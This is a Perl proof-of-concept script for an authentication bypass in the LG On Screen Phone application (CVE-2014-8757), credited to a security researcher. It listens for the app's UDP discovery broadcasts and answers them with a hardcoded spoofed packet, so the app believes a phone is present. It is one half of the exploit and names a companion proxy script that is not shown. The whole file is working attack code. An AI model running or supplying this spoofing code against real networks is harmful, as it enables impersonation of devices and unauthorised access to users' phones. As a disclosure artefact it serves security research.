#!/usr/bin/perl
#
# PoC code for LG On Screen Phone authentication bypass vulnerability (CVE-2014-8757), 
# discovered by Imre Rad, Search-Lab Ltd.
#
# This helper script listens for discovery broadcast messages of the official LG On Screen Phone 
# application and answers them, so the application would believe a Phone running OSP is available locally.
#
# The seconds script, osp-proxy.pl excepts the actual communication and exploits the vulnerability.
#

use strict;
use warnings;
use IO::Socket::INET;



my $discovery = IO::Socket::INET->new(
  LocalPort => 19528,
  Proto => 'udp'
) or die "couldnt: $! $@";


while(1)
{
  # read operation on the socket
  my $recieved_data = myrecv($discovery);
  # print "recvd: $recieved_data ".$discovery->peerhost().":".$discovery->peerport()."\n";
  
  	my $answer = IO::Socket::INET->new(
	  PeerAddr => $discovery->peerhost().":".$discovery->peerport(),
	  Proto => 'udp'
	) or die "couldnt: $! $@";

  mysend($answer, "
00000000  19 76 73 7f 73 48 63 16  73 0b 73 41 63 4c 73 0e .vs.sHc. s.sAcLs.
00000010  73 47 63 47 73 5c 73 14  63 47 73 0a 73 49 63 4d sGcGss. cGs.sIcM
00000020  73 58 73 11 63 7d 73 3f  73 02 63 1b 73 17 73 09 sXs.c}s? s.c.s.s.
00000030  63 54 73 00 73 03 63 04                          cTs.s.c. 
");
  $answer->close();

}



sub mysend {
  my $sock = shift;
  my $msg = shift;
  my $bin = "";
  $msg =~ s/^\s*[0-9a-f]{8} //gm;
  while($msg =~ /([0-9a-f]{2}) /g) {
     $bin .= pack("H*",$1);
  }
  
	
  print ">> ".unpack("H*", $bin)."\n\n";
  print $sock $bin ;
}


sub myrecv {
  my $sock = shift;
  my ($re, $r);
    $r = $sock->recv($re, 4096) ;
  die "couldnt read: $@" if(!$r);
  print "<< ".unpack("H*", $re)."\n";
  print "<<ASCII: $re\n\n";
  return $re;
}
